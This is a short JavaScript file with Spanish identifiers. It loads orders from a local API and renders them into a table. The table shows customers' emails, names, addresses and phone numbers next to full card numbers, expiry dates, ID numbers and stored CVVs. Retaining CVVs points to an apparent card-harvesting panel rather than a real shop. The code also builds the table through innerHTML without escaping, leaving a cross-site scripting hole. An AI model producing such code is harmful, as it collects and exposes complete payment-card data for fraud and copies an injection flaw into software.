const estadoTexto = document.getElementById('estado');
const tabla = document.getElementById('tabla-pedidos');

async function cargarPedidos() {
  try {
    const respuesta = await fetch('/api/orders');

    if (!respuesta.ok) {
      throw new Error(`El servidor respondió con estado ${respuesta.status}`);
    }

    const orders = await respuesta.json();

    if (orders.length === 0) {
      estadoTexto.textContent = 'No hay pedidos todavía.';
      return;
    }

    tabla.innerHTML = orders.map(o => `
      <tr>
        <td>${o.contacto?.email ?? '-'}</td>
        <td>${o.entrega?.nombre ?? '-'}</td>
        <td>${o.entrega?.segundoNombre ?? '-'}</td>
        <td>${o.entrega?.apellidos ?? '-'}</td>
        <td>${o.entrega?.direccion ?? '-'}</td>
        <td>${o.entrega?.cvvPostal ?? '-'}</td>
        <td>${o.entrega?.ciudad ?? '-'}</td>
        <td>${o.entrega?.telefono ?? '-'}</td>
        <td>${o.pago?.numeroTarjeta ?? '-'}</td>
        <td>${o.pago?.vencimiento ?? '-'}</td>
        <td>${o.pago?.titular ?? '-'}</td>
        <td>${o.pago?.numeroDocumento ?? '-'}</td>
        <td>${o.pago?.cvv ?? '-'}</td>
      </tr>
    `).join('');

    estadoTexto.textContent = `Mostrando ${orders.length} pedido(s).`;

  } catch (error) {
    console.error(error);
    estadoTexto.textContent = 'Error al cargar los pedidos. Revisá la consola (F12).';
  }
}

cargarPedidos();
